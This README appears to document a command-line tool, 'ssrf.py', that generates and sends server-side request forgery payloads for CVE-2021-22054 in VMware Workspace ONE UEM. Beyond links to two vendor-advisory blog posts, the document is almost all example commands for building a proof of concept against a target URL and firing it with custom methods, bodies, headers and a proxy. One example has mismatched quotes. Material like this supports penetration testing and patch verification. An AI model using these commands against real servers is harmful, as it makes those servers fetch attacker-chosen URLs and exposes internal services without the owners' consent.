# CVE-2021-22054
Generate SSRF payloads

#### References
https://blog.assetnote.io/2022/04/27/advisory-vmware-workspace-one-uem/

https://blog.assetnote.io/2022/04/27/vmware-workspace-one-uem-ssrf/

#### Examples
```bash

# generate POC
python3 ssrf.py --url https://target.com --url https://example.com --airwatch
python3 ssrf.py --url https://target.com --url https://example.com

# generate PPOC and send request
python3 ssrf.py --url https://target.com --url https://example.com --airwatch --request --proxy http://127.0.0.1:8080
python3 ssrf.py --url https://target.com --url https://example.com --airwatch --request --method POST --data '{"a":1}' -H 'Content-Type: application/json" --debug-headers
```

![image](https://user-images.githubusercontent.com/17793927/171933588-1b8d92f4-c751-40ca-a6bc-ad2102022bcf.png)

![image](https://user-images.githubusercontent.com/17793927/171933638-a0be0782-32cc-41db-b892-b49a9adcd574.png)
